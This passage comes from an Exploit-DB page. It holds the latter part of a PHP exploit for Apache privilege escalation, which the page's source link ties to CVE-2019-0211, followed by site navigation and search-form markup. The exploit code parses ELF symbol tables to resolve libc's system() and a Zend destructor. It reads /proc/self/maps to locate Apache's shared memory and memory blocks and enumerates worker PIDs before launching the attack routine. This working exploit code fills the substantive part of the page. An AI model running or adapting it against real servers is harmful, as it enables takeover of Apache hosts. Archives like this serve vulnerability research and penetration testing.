        $SHT_SYMTAB = 2;
        $SHT_STRTAB = 3;

        switch($sh_type)
        {
            case $SHT_DYNSYM:
                $dynsym_off = str2ptr($elf, $offset + 0x18, 8);
                $dynsym_sz = str2ptr($elf, $offset + 0x20, 8);
                break;
            case $SHT_STRTAB:
            case $SHT_SYMTAB:
                if(!$dynstr_off)
                    $dynstr_off = str2ptr($elf, $offset + 0x18, 8);
                break;
        }

    }

    if(!($dynsym_off &amp;&amp; $dynsym_sz &amp;&amp; $dynstr_off))
        exit(&#039;.&#039;);

    $sizeof_Elf64_Sym = 0x18;

    for($i=0;$i * $sizeof_Elf64_Sym &lt; $dynsym_sz;$i++)
    {
        $offset = $dynsym_off + $i * $sizeof_Elf64_Sym;
        $st_name = str2ptr($elf, $offset, 4);
        
        if(!$st_name)
            continue;
        
        $offset_string = $dynstr_off + $st_name;
        $end = strpos($elf, &quot;\x00&quot;, $offset_string) - $offset_string;
        $string = substr($elf, $offset_string, $end);

        if($string == $symbol)
        {
            $st_value = str2ptr($elf, $offset + 0x8, 8);
            return $st_value;
        }
    }

    die(&#039;Unable to find symbol &#039; . $symbol);
}

# Obtains the addresses of the shared memory block and some functions through 
# /proc/self/maps
# This is hacky as hell.
function get_all_addresses()
{
	$addresses = [];
	$data = file_get_contents(&#039;/proc/self/maps&#039;);
	$follows_shm = false;

	foreach(explode(&quot;\n&quot;, $data) as $line)
	{
		if(!isset($addresses[&#039;shm&#039;]) &amp;&amp; strpos($line, &#039;/dev/zero&#039;))
		{
            $line = explode(&#039; &#039;, $line)[0];
            $bounds = array_map(&#039;hexdec&#039;, explode(&#039;-&#039;, $line));
            if ($bounds[1] - $bounds[0] == 0x14000)
            {
                $addresses[&#039;shm&#039;] = $bounds;
                $follows_shm = true;
            }
        }
		if(
			preg_match(&#039;#(/[^\s]+libc-[0-9.]+.so[^\s]*)#&#039;, $line, $matches) &amp;&amp;
			strpos($line, &#039;r-xp&#039;)
		)
		{
			$offset = find_symbol($matches[1], &#039;system&#039;);
			$line = explode(&#039; &#039;, $line)[0];
			$line = hexdec(explode(&#039;-&#039;, $line)[0]);
			$addresses[&#039;system&#039;] = $line + $offset;
		}
		if(
			strpos($line, &#039;libapr-1.so&#039;) &amp;&amp;
			strpos($line, &#039;r-xp&#039;)
		)
		{
			$line = explode(&#039; &#039;, $line)[0];
			$bounds = array_map(&#039;hexdec&#039;, explode(&#039;-&#039;, $line));
			$addresses[&#039;libaprX&#039;] = $bounds;
		}
		if(
			strpos($line, &#039;libapr-1.so&#039;) &amp;&amp;
			strpos($line, &#039;r--p&#039;)
		)
		{
			$line = explode(&#039; &#039;, $line)[0];
			$bounds = array_map(&#039;hexdec&#039;, explode(&#039;-&#039;, $line));
			$addresses[&#039;libaprR&#039;] = $bounds;
		}
		# Apache&#039;s memory block is between the SHM and ld.so
		# Sometimes some rwx region gets mapped; all_buckets cannot be in there
		# but we include it anyways for the sake of simplicity
		if(
			(
				strpos($line, &#039;rw-p&#039;) ||
				strpos($line, &#039;rwxp&#039;)
			) &amp;&amp;
            $follows_shm
		)
		{
            if(strpos($line, &#039;/lib&#039;))
            {
                $follows_shm = false;
                continue;
            }
			$line = explode(&#039; &#039;, $line)[0];
			$bounds = array_map(&#039;hexdec&#039;, explode(&#039;-&#039;, $line));
			if(!array_key_exists(&#039;apache&#039;, $addresses))
			    $addresses[&#039;apache&#039;] = $bounds;
			else if($addresses[&#039;apache&#039;][1] == $bounds[0])
                $addresses[&#039;apache&#039;][1] = $bounds[1];
			else
                $follows_shm = false;
		}
		if(
			preg_match(&#039;#(/[^\s]+libphp7[0-9.]+.so[^\s]*)#&#039;, $line, $matches) &amp;&amp;
			strpos($line, &#039;r-xp&#039;)
		)
		{
			$offset = find_symbol($matches[1], &#039;zend_object_std_dtor&#039;);
			$line = explode(&#039; &#039;, $line)[0];
			$line = hexdec(explode(&#039;-&#039;, $line)[0]);
			$addresses[&#039;zend_object_std_dtor&#039;] = $line + $offset;
		}
	}

	$expected = [
		&#039;shm&#039;, &#039;system&#039;, &#039;libaprR&#039;, &#039;libaprX&#039;, &#039;apache&#039;, &#039;zend_object_std_dtor&#039;
	];
	$missing = array_diff($expected, array_keys($addresses));

	if($missing)
	{
		o(
			&#039;The following addresses were not determined by parsing &#039; .
			&#039;/proc/self/maps: &#039; . implode(&#039;, &#039;, $missing)
		);
		exit(0);
	}


	o(&#039;PID: &#039; . getmypid());
	o(&#039;Fetching addresses&#039;);

	foreach($addresses as $k =&gt; $a)
	{
		if(!is_array($a))
			$a = [$a];
		o(&#039;  &#039; . $k . &#039;: &#039; . implode(&#039;-0x&#039;, array_map(function($z) {
				return &#039;0x&#039; . dechex($z);
		}, $a)));
	}
	o(&#039;&#039;);

	return $addresses;
}

# Extracts PIDs of apache workers using /proc/*/cmdline and /proc/*/status,
# matching the cmdline and the UID
function get_workers_pids()
{
	o(&#039;Obtaining apache workers PIDs&#039;);
	$pids = [];
	$cmd = file_get_contents(&#039;/proc/self/cmdline&#039;);
	$processes = glob(&#039;/proc/*&#039;);
	foreach($processes as $process)
	{
		if(!preg_match(&#039;#^/proc/([0-9]+)$#&#039;, $process, $match))
			continue;
		$pid = (int) $match[1];
		if(
			!is_readable($process . &#039;/cmdline&#039;) ||
			!is_readable($process . &#039;/status&#039;)
		)
			continue;
		if($cmd !== file_get_contents($process . &#039;/cmdline&#039;))
			continue;

		$status = file_get_contents($process . &#039;/status&#039;);
		foreach(explode(&quot;\n&quot;, $status) as $line)
		{
			if(
				strpos($line, &#039;Uid:&#039;) === 0 &amp;&amp;
				preg_match(&#039;#\b&#039; . posix_getuid() . &#039;\b#&#039;, $line)
			)
			{
				o(&#039;  Found apache worker: &#039; . $pid);
				$pids[$pid] = $pid;
				break;
			}

		}
	}
	
	o(&#039;Got &#039; . sizeof($pids) . &#039; PIDs.&#039;);
	o(&#039;&#039;);

	return $pids;
}

$addresses = get_all_addresses();
$workers_pids = get_workers_pids();
real();
            </code></pre>

                    </div>

                    <div class="card-footer">

                        <div class="row">

                            <div class="col">

                                <strong>Tags:</strong>

                                
                            </div>

                            <div class="col">

                                
                                
                            </div>

                            <div class="col">

                                <span class="float-right">

                                    <strong>Advisory/Source:</strong>

                                    <a href="https://github.com/cfreal/exploits/blob/ba026fae59974037d744a90cef09224f751bc3e4/CVE-2019-0211-apache/cfreal-carpediem.php" target="_blank">
                                        Link
                                    </a>

                                </span>

                            </div>

                        </div>

                        <div class="row mt-3">

                            <div class="btn-group ml-2">

                                <a class="btn btn-primary btn-fab btn-icon btn-round"
                                   href="/exploits/46675" aria-label="View Previous Exploit"
                                   data-toggle="tooltip" data-placement="top" title="Previous Exploit" >
                                    <i class="mdi mdi-arrow-left mdi-36px"></i>
                                </a>

                            </div>

                            <div class="col">

                                <div class="btn-group float-right">

                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
                                       href="/exploits/46677" aria-label="View Next Exploit"
                                       data-toggle="tooltip" data-placement="top" title="Next Exploit" >
                                        <i class="mdi mdi-arrow-right mdi-36px"></i>
                                    </a>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

                <div class="card">

                    <div class="card-footer">

    <div class="d-none d-lg-block">

        <div class="container-fluid">

            <table class="table table-borderless text-center">

                <thead style="background-color:#083257;">

                <!-- marker #1 -->
                <tr class="text-white">
                    <th>
                        <strong>Databases</strong>
                    </th>
                    <th>
                        <strong>Links</strong>
                    </th>
                    <th>
                        <strong>Sites</strong>
                    </th>
                    <th>
                        <strong>Solutions</strong>
                    </th>
                </tr>

                </thead>

                <tbody>

                <tr class="text-center">
                    <td>
                        <a href="/">
                            Exploits
                        </a>
                    </td>
                    <td>
                        <a href="/search">
                            Search Exploit-DB
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offsec.com/"
                           target="_blank" rel="noopener">
                            OffSec
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offsec.com/courses-and-certifications/"
                           target="_blank" rel="noopener">Courses and Certifications
                        </a>
                    </td>
                </tr>

                <tr class="text-center">
                    <td>
                        <a href="/google-hacking-database">
                            Google Hacking
                        </a>
                    </td>
                    <td>
                        <a href="/submit">
                            Submit Entry
                        </a>
                    </td>
                    <td>
                        <a href="https://www.kali.org/"
                           target="_blank" rel="noopener">
                            Kali Linux
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offsec.com/learn/"
                           target="_blank" rel="noopener">Learn Subscriptions
                        </a>
                    </td>
                </tr>

                <tr>
                    <td>
                        <a href="/papers">
                            Papers
                        </a>
                    </td>
                    <td>
                        <a href="/serchsploit">
                            SearchSploit Manual
                        </a>
                    </td>
                    <td>
                        <a href="https://www.vulnhub.com/"
                           target="_blank" rel="noopener">VulnHub
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offsec.com/cyber-range/"
                           target="_blank" rel="noopener">OffSec Cyber Range
                        </a>
                    </td>
                </tr>

                <tr>
                    <td>
                        <a href="/shellcodes">
                            Shellcodes
                        </a>
                    </td>
                    <td>
                        <a href="/statistics">
                            Exploit Statistics
                        </a>
                    </td>
                    <td></td>
                    <td>
                        <a href="https://www.offsec.com/labs/"
                           target="_blank" rel="noopener">Proving Grounds
                        </a>
                    </td>
                </tr>

                <tr>
                    <td></td>
                    <td></td>
                    <td></td>
                    <td>
                        <a href="https://www.offsec.com/penetration-testing/"
                           target="_blank" rel="noopener">Penetration Testing Services
                        </a>
                    </td>
                </tr>
                </tbody>

            </table>

        </div>

    </div>

    <div class="d-lg-none text-center">

        <div class="btn-group btn-block mt-1">

            <!-- marker #2 -->
            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownDatabases" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Databases
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownDatabases">

                <a class="dropdown-item"
                    href="/">
                    Exploits
                </a>
                <a class="dropdown-item"
                   href="/google-hacking-database">
                    Google Hacking
                </a>
                <a class="dropdown-item"
                   href="/papers">
                    Papers
                </a>
                <a class="dropdown-item"
                   href="/shellcodes">
                    Shellcodes
                </a>
            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownLinks" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Links
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownLinks">

                <a class="dropdown-item"
                   href="/search">Search Exploit-DB
                </a>
                <a class="dropdown-item"
                   href="/submit">Submit Entry
                </a>
                <a class="dropdown-item"
                   href="/searchsploit">SearchSploit Manual
                </a>
                <a class="dropdown-item"
                   href="/statistics">Exploit Statistics
                </a>
            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownSites" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Sites
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownSites">

                <a class="dropdown-item"
                   href="https://www.offsec.com"
                   target="_blank" rel="noopener">OffSec
                </a>
                <a class="dropdown-item"
                   href="https://www.kali.org/"
                   target="_blank" rel="noopener">Kali Linux
                </a>
                <a class="dropdown-item"
                   href="https://www.vulnhub.com"
                   target="_blank" rel="noopener">VulnHub
                </a>
            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownSolutions" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Solutions
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownSolutions">

                <a class="dropdown-item" href="https://www.offsec.com/courses-and-certifications/"
                   target="_blank" rel="noopener">Courses and Certifications
                </a>
                <a class="dropdown-item" href="https://www.offsec.com/learn/"
                   target="_blank" rel="noopener">Learn Subscriptions
                </a>
                <a class="dropdown-item" href="https://www.offsec.com/cyber-range/"
                   target="_blank" rel="noopener">OffSec Cyber Range
                </a>
                <a class="dropdown-item" href="https://www.offsec.com/labs/"
                   target="_blank" rel="noopener">Proving Grounds
                </a>
                <a class="dropdown-item" href="https://www.offsec.com/penetration-testing/"
                   target="_blank" rel="noopener">Penetration Testing Services
                </a>
            </div>

        </div>

    </div>

</div>

                </div>

            </div>

        </div>

    </div>


        
        <footer class="footer">

    <div class="container-fluid">

        <nav>

            <ul>

                <li>
                    <a href="https://twitter.com/exploitdb" target="_blank" aria-label="Exploit-DB Twitter" rel="noopener">

    <i class="mdi mdi-twitter mdi-36px"></i>
</a>


<a href="https://www.facebook.com/ExploitDB" target="_blank" aria-label="Exploit-DB Facebook" rel="noopener">

    <i class="mdi mdi-facebook mdi-36px"></i>
</a>


<a href="https://gitlab.com/exploit-database/exploitdb" target="_blank" aria-label="Exploit-DB GitLab" rel="noopener">

    <i class="mdi mdi-gitlab mdi-36px"></i>
</a>


<a href="/rss.xml" target="_blank" aria-label="Exploit-DB RSS" rel="noopener">

    <i class="mdi mdi-rss mdi-36px"></i>
</a>
                </li>

                <li>

                    <a href="/">
                        Exploit Database by OffSec
                    </a>

                </li>

                <li>

                    <a href="/terms">
                        Terms
                    </a>

                </li>

                <li>

                    <a href="/privacy">
                        Privacy
                    </a>

                </li>

                <li>

                    <!-- <a href="#" data-toggle="modal" data-target="#about"> -->
                        <a href="/about-exploit-db">
                        About Us
                    </a>

                </li>

                <li>

                    <a href="/faq">
                        FAQ
                    </a>

                </li>

                <li>

                    <a href="/cookies">
                        Cookies
                    </a>

                </li>

            </ul>

        </nav>

        <div class="copyright mt-4">

            &copy;
            <a href="https://www.offsec.com/" target="_blank">OffSec Services Limited</a> 2024. All rights reserved.

        </div>

    </div>

    <!-- About EDB/GHDB Modal -->
<div class="modal fade bd-example-modal-lg" id="about" tabindex="-1"
     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">

    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
         role="document">

        <div class="modal-content">

            <div class="modal-header">

                <h5 class="modal-title"
                    id="aboutModalTitle">About The Exploit Database
                </h5>

                <button type="button" class="close" data-dismiss="modal"
                        aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>

            </div>

            <div class="modal-body">

                <div class="row">

                    <p>
                        <a href="https://www.offsec.com/" target="_blank" rel="noopener">
                            <img class="float-left" src="/images/offsec-logo.png"
                                 alt="OffSec">
                        </a>
                        The Exploit Database is maintained by <a
                                href="https://www.offsec.com/community-projects/"
                                target="_blank" rel="noopener">OffSec</a>, an information security training company
                        that provides various <a
                                href="https://www.offsec.com/courses-and-certifications/"
                                target="_blank" rel="noopener">Information Security Certifications</a> as well as high end <a
                                href="https://www.offsec.com/penetration-testing/"
                                target="_blank" rel="noopener">penetration testing</a> services. The Exploit Database is a
                        non-profit project that is provided as a public service by OffSec.
                    </p>

                    <p>The Exploit Database is a <a
                                href="http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html" target="_blank" rel="noopener">CVE
                            compliant</a> archive of public exploits and corresponding vulnerable software,
                        developed for use by penetration testers and vulnerability researchers. Our aim is to serve
                        the most comprehensive collection of exploits gathered through direct submissions, mailing
                        lists, as well as other public sources, and present them in a freely-available and
                        easy-to-navigate database. The Exploit Database is a repository for exploits and
                        proof-of-concepts rather than advisories, making it a valuable resource for those who need
                        actionable data right away.
                    </p>

                    <p>The <a href="/google-hacking-database">Google Hacking Database (GHDB)</a>
                        is a categorized index of Internet search engine queries designed to uncover interesting,
                        and usually sensitive, information made publicly available on the Internet. In most cases,
                        this information was never meant to be made public but due to any number of factors this
                        information was linked in a web document that was crawled by a search engine that
                        subsequently followed that link and indexed the sensitive information.
                    </p>

                    <p>The process known as “Google Hacking” was popularized in 2000 by Johnny
                        Long, a professional hacker, who began cataloging these queries in a database known as the
                        Google Hacking Database. His initial efforts were amplified by countless hours of community
                        member effort, documented in the book Google Hacking For Penetration Testers and popularised
                        by a barrage of media attention and Johnny’s talks on the subject such as this early talk
                        recorded at <a href="https://www.defcon.org/html/links/dc-archives/dc-13-archive.html"
                                       target="_blank" rel="noopener">DEFCON 13</a>. Johnny coined the term “Googledork” to refer
                        to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
                        the fact that this was not a “Google problem” but rather the result of an often
                        unintentional misconfiguration on the part of a user or a program installed by the user.
                        Over time, the term “dork” became shorthand for a search query that located sensitive
                        information and “dorks” were included with may web application vulnerability releases to
                        show examples of vulnerable web sites.
                    </p>

                    <p>
                        After nearly a decade of hard work by the community, Johnny turned the GHDB
                        over to <a
                                href="https://www.offsec.com/community-projects/"
                                target="_blank" rel="noopener">OffSec</a> in November 2010, and it is now maintained as
                        an extension of the <a href="/">Exploit Database</a>. Today, the GHDB includes searches for
                        other online search engines such as <a href="https://www.bing.com/" target="_blank" rel="noopener">Bing</a>,
                        and other online repositories like <a href="https://github.com/" target="_blank" rel="noopener">GitHub</a>,
                        producing different, yet equally valuable results.
                    </p>


                </div>

            </div>

            <div class="modal-footer">

                <button type="button"
                        class="btn btn-primary"
                        data-dismiss="modal">Close
                </button>

            </div>

        </div>

    </div>

</div>


    <div class="modal fade bd-example-modal-lg" id="osresources" tabindex="-1"
     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">

    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
         role="document">

        <div class="modal-content">

            <div class="modal-header">

                <h5 class="modal-title text-primary"
                    id="resourcesModalTitle">OffSec Resources
                </h5>

                <button type="button" class="close" data-dismiss="modal"
                        aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>

            </div>

            <div class="modal-body">

                <table class="table dataTable table-borderless">

                            <thead>

                            <!-- marker #3 -->
                            <tr>
                                <th>
                                    <strong>Databases</strong>
                                </th>
                                <th>
                                    <strong>Links</strong>
                                </th>
                                <th>
                                    <strong>Sites</strong>
                                </th>
                                <th>
                                    <strong>Solutions</strong>
                                </th>
                            </tr>

                            </thead>

                            <tbody>

                            <tr class="text-center">
                                <td>
                                    <a href="/">
                                        Exploits
                                    </a>
                                </td>
                                <td>
                                    <a href="/search">
                                        Search Exploit-DB
                                    </a>
                                </td>
                                <td>
                                    <a href="https://www.offsec.com/"
                                       target="_blank" rel="noopener">
                                        OffSec
                                    </a>
                                </td>
                                <td>
                                    <a href="https://www.offsec.com/courses-and-certifications/"
                                       target="_blank" rel="noopener">Courses and Certifications
                                    </a>
                                </td>
                            </tr>

                            <tr class="text-center">
                                <td>
                                    <a href="/google-hacking-database">
                                        Google Hacking
                                    </a>
                                </td>
                                <td>
                                    <a href="/submit">
                                        Submit Entry
                                    </a>
                                </td>
                                <td>
                                    <a href="https://www.kali.org/"
                                       target="_blank" rel="noopener">
                                        Kali Linux
                                    </a>
                                </td>
                                <td>
                                    <a href="https://www.offsec.com/learn/"
                                       target="_blank" rel="noopener">Learn Subscriptions
                                    </a>

                                </td>
                            </tr>

                            <tr class="text-center">
                                <td>
                                    <a href="/papers">
                                        Papers
                                    </a>
                                </td>
                                <td>
                                    <a href="/serchsploit">
                                        SearchSploit Manual
                                    </a>
                                </td>
                                <td>
                                    <a href="https://www.vulnhub.com/"
                                       target="_blank" rel="noopener">VulnHub
                                    </a>
                                </td>
                                <td>
                                    <a href="https://www.offsec.com/cyber-range/"
                                       target="_blank" rel="noopener">OffSec Cyber Range
                                    </a>
                                </td>
                            </tr>

                            <tr class="text-center">
                                <td></td>
                                <td>
                                    <a href="https://www.offsec.com/labs/"
                                       target="_blank" rel="noopener">Proving Grounds
                                    </a>
                                </td>
                            </tr>

                            <tr class="text-center">
                                <td>
                                    <a href="/shellcodes">
                                        Shellcodes
                                    </a>
                                </td>
                                <td>
                                    <a href="/serchsploit">
                                        Exploit Statistics
                                    </a>
                                </td>
                                <td></td>
                                <td>
                                    <a href="https://www.offsec.com/labs/"
                                       target="_blank" rel="noopener">Proving Grounds
                                    </a>
                                </td>
                            </tr>
                            <tr>
                                <td></td>
                                <td></td>
                                <td></td>
                                <td>
                                    <a href="https://www.offsec.com/penetration-testing/"
                                       target="_blank" rel="noopener">Penetration Testing Services
                                    </a>
                                </td>
                            </tr>

                            </tbody>

                        </table>

            </div>

            <div class="modal-footer">

                <button type="button"
                        class="btn btn-primary"
                        data-dismiss="modal">Close
                </button>

            </div>

        </div>

    </div>

</div>

    <!-- Advanced Search Modal -->
<div class="modal fade bd-example-modal-lg" id="search" tabindex="-1"
     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">

    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
         role="document">

        <div class="modal-content">

            <div class="modal-header">

                <h5 class="modal-title"
                    id="searchModalTitle">Search The Exploit Database
                </h5>

                <button type="button" class="close" data-dismiss="modal"
                        aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>

            </div>

            <div class="modal-body">

                <form action="https://www.exploit-db.com/search" method="GET" id="searchForm">

                    <div class="row">

                        <div class="col-sm-12 col-lg-8">

                            <div class="form-group">

                                <label for="titleSearch" class="control-label text-primary">Title</label>

                                <input id="titleSearch" class="form-control" type="text" name="q" class="q"
                                       placeholder="Title" value="" autofocus>

                            </div>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <div class="form-group">

                                <label for="cveSearch" class="control-label text-primary">CVE</label>

                                <input id="cveSearch" class="form-control" type="text" name="cve" class="cve"
                                       placeholder="2024-1234"
                                       value="" autofocus>

                            </div>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-sm-6 col-lg-4">

                            <label for="typeSearchSelect" class="text-primary">Type</label>

                            <select id="typeSearchSelect" name="type" class="form-control">

                                <option></option>
                                
                                    <option value="dos" >
                                        dos
                                    </option>


                                
                                    <option value="local" >
                                        local
                                    </option>


                                
                                    <option value="remote" >
                                        remote
                                    </option>


                                
                                    <option value="shellcode" >
                                        shellcode
                                    </option>


                                
                                    <option value="papers" >
                                        papers
                                    </option>


                                
                                    <option value="webapps" >
                                        webapps
                                    </option>


                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <label for="platformSearchSelect" class="text-primary">Platform</label>

                            <select id="platformSearchSelect" name="platform" class="form-control">

                                <option></option>
                                
                                    <option value="aix" >
                                        AIX
                                    </option>

                                
                                    <option value="asp" >
                                        ASP
                                    </option>

                                
                                    <option value="bsd" >
                                        BSD
                                    </option>

                                
                                    <option value="bsd_ppc" >
                                        BSD_PPC
                                    </option>

                                
                                    <option value="bsd_x86" >
                                        BSD_x86
                                    </option>

                                
                                    <option value="bsdi_x86" >
                                        BSDi_x86
                                    </option>

                                
                                    <option value="cgi" >
                                        CGI
                                    </option>

                                
                                    <option value="freebsd" >
                                        FreeBSD
                                    </option>

                                
                                    <option value="freebsd_x86" >
                                        FreeBSD_x86
                                    </option>

                                
                                    <option value="freebsd_x86-64" >
                                        FreeBSD_x86-64
                                    </option>

                                
                                    <option value="generator" >
                                        Generator
                                    </option>

                                
                                    <option value="hardware" >
                                        Hardware
                                    </option>

                                
                                    <option value="hp-ux" >
                                        HP-UX
                                    </option>

                                
                                    <option value="irix" >
                                        IRIX
                                    </option>

                                
                                    <option value="jsp" >
                                        JSP
                                    </option>

                                
                                    <option value="linux" >
                                        Linux
                                    </option>

                                
                                    <option value="linux_mips" >
                                        Linux_MIPS
                                    </option>

                                
                                    <option value="linux_ppc" >
                                        Linux_PPC
                                    </option>

                                
                                    <option value="linux_sparc" >
                                        Linux_SPARC
                                    </option>

                                
                                    <option value="linux_x86" >
                                        Linux_x86
                                    </option>

                                
                                    <option value="linux_x86-64" >
                                        Linux_x86-64
                                    </option>

                                
                                    <option value="minix" >
                                        MINIX
                                    </option>

                                
                                    <option value="multiple" >
                                        Multiple
                                    </option>

                                
                                    <option value="netbsd_x86" >
                                        NetBSD_x86
                                    </option>

                                
                                    <option value="novell" >
                                        Novell
                                    </option>

                                
                                    <option value="openbsd" >
                                        OpenBSD
                                    </option>

                                
                                    <option value="openbsd_x86" >
                                        OpenBSD_x86
                                    </option>

                                
                                    <option value="osx_ppc" >
                                        OSX_PPC
                                    </option>

                                
                                    <option value="osx" >
                                        OSX
                                    </option>

                                
                                    <option value="php" >
                                        PHP
                                    </option>

                                
                                    <option value="plan9" >
                                        Plan9
                                    </option>

                                
                                    <option value="qnx" >
                                        QNX
                                    </option>

                                
                                    <option value="sco" >
                                        SCO
                                    </option>

                                
                                    <option value="sco_x86" >
                                        SCO_x86
                                    </option>

                                
                                    <option value="solaris" >
                                        Solaris
                                    </option>

                                
                                    <option value="solaris_sparc" >
                                        Solaris_SPARC
                                    </option>

                                
                                    <option value="solaris_x86" >
                                        Solaris_x86
                                    </option>

                                
                                    <option value="tru64" >
                                        Tru64
                                    </option>

                                
                                    <option value="ultrix" >
                                        ULTRIX
                                    </option>

                                
                                    <option value="unix" >
                                        Unix
                                    </option>

                                
                                    <option value="unixware" >
                                        UnixWare
                                    </option>

                                
                                    <option value="windows_x86" >
                                        Windows_x86
                                    </option>

                                
                                    <option value="windows_x86-64" >
                                        Windows_x86-64
                                    </option>

                                
                                    <option value="windows" >
                                        Windows
                                    </option>

                                
                                    <option value="arm" >
                                        ARM
                                    </option>

                                
                                    <option value="cfm" >
                                        CFM
                                    </option>

                                
                                    <option value="netware" >
                                        Netware
                                    </option>

                                
                                    <option value="superh_sh4" >
                                        SuperH_SH4
                                    </option>

                                
                                    <option value="java" >
                                        Java
                                    </option>

                                
                                    <option value="beos" >
                                        BeOS
                                    </option>

                                
                                    <option value="immunix" >
                                        Immunix
                                    </option>

                                
                                    <option value="palm_os" >
                                        Palm_OS
                                    </option>

                                
                                    <option value="atheos" >
                                        AtheOS
                                    </option>

                                
                                    <option value="ios" >
                                        iOS
                                    </option>

                                
                                    <option value="android" >
                                        Android
                                    </option>

                                
                                    <option value="xml" >
                                        XML
                                    </option>

                                
                                    <option value="perl" >
                                        Perl
                                    </option>

                                
                                    <option value="python" >
                                        Python
                                    </option>

                                
                                    <option value="system_z" >
                                        System_z
                                    </option>

                                
                                    <option value="json" >
                                        JSON
                                    </option>

                                
                                    <option value="ashx" >
                                        ASHX
                                    </option>

                                
                                    <option value="ruby" >
                                        Ruby
                                    </option>

                                
                                    <option value="aspx" >
                                        ASPX
                                    </option>

                                
                                    <option value="macos" >
                                        macOS
                                    </option>

                                
                                    <option value="linux_crisv32" >
                                        Linux_CRISv32
                                    </option>

                                
                                    <option value="ezine" >
                                        eZine
                                    </option>

                                
                                    <option value="magazine" >
                                        Magazine
                                    </option>

                                
                                    <option value="nodejs" >
                                        NodeJS
                                    </option>

                                
                                    <option value="alpha" >
                                        Alpha
                                    </option>

                                
                                    <option value="solaris_mips" >
                                        Solaris_MIPS
                                    </option>

                                
                                    <option value="lua" >
                                        Lua
                                    </option>

                                
                                    <option value="watchos" >
                                        watchOS
                                    </option>

                                
                                    <option value="vxworks" >
                                        VxWorks
                                    </option>

                                
                                    <option value="python2" >
                                        Python2
                                    </option>

                                
                                    <option value="python3" >
                                        Python3
                                    </option>

                                
                                    <option value="typescript" >
                                        TypeScript
                                    </option>

                                
                                    <option value="go" >
                                        Go
                                    </option>

                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <div class="form-group">

                                <label for="authorSearch" class="text-primary">Author</label>

                                <input id="authorSearch" class="form-control" type="text" name="e_author"
                                       placeholder="Author" value="">

                            </div>
                        </div>

                    </div>

                    <div class="row">

                        <div class="col-sm-12 col-lg-6">

                            <div class="form-group">

                                <label for="textSearch" class="control-label text-primary">Content</label>

                                <input id="textSearch" class="form-control" type="text" name="text"
                                       placeholder="Exploit content" value="">

                            </div>

                        </div>

                        <div class="col-sm-6 col-lg-2">

                            <label for="portSearchSelect" class="text-primary">Port</label>

                            <select id="portSearchSelect" name="port" class="form-control">

                                <option></option>
                                
                                    <option value="14" >
                                        14
                                    </option>


                                
                                    <option value="21" >
                                        21
                                    </option>


                                
                                    <option value="22" >
                                        22
                                    </option>


                                
                                    <option value="23" >
                                        23
                                    </option>


                                
                                    <option value="25" >
                                        25
                                    </option>


                                
                                    <option value="42" >
                                        42
                                    </option>


                                
                                    <option value="49" >
                                        49
                                    </option>


                                
                                    <option value="53" >
                                        53
                                    </option>


                                
                                    <option value="66" >
                                        66
                                    </option>


                                
                                    <option value="69" >
                                        69
                                    </option>


                                
                                    <option value="70" >
                                        70
                                    </option>


                                
                                    <option value="79" >
                                        79
                                    </option>


                                
                                    <option value="80" >
                                        80
                                    </option>


                                
                                    <option value="81" >
                                        81
                                    </option>


                                
                                    <option value="102" >
                                        102
                                    </option>


                                
                                    <option value="105" >
                                        105
                                    </option>


                                
                                    <option value="110" >
                                        110
                                    </option>


                                
                                    <option value="111" >
                                        111
                                    </option>


                                
                                    <option value="113" >
                                        113
                                    </option>


                                
                                    <option value="119" >
                                        119
                                    </option>


                                
                                    <option value="123" >
                                        123
                                    </option>


                                
                                    <option value="135" >
                                        135
                                    </option>


                                
                                    <option value="139" >
                                        139
                                    </option>


                                
                                    <option value="143" >
                                        143
                                    </option>


                                
                                    <option value="161" >
                                        161
                                    </option>


                                
                                    <option value="162" >
                                        162
                                    </option>


                                
                                    <option value="164" >
                                        164
                                    </option>


                                
                                    <option value="383" >
                                        383
                                    </option>


                                
                                    <option value="389" >
                                        389
                                    </option>


                                
                                    <option value="402" >
                                        402
                                    </option>


                                
                                    <option value="406" >
                                        406
                                    </option>


                                
                                    <option value="411" >
                                        411
                                    </option>


                                
                                    <option value="443" >
                                        443
                                    </option>


                                
                                    <option value="444" >
                                        444
                                    </option>


                                
                                    <option value="445" >
                                        445
                                    </option>


                                
                                    <option value="446" >
                                        446
                                    </option>


                                
                                    <option value="502" >
                                        502
                                    </option>


                                
                                    <option value="504" >
                                        504
                                    </option>


                                
                                    <option value="513" >
                                        513
                                    </option>


                                
                                    <option value="514" >
                                        514
                                    </option>


                                
                                    <option value="515" >
                                        515
                                    </option>


                                
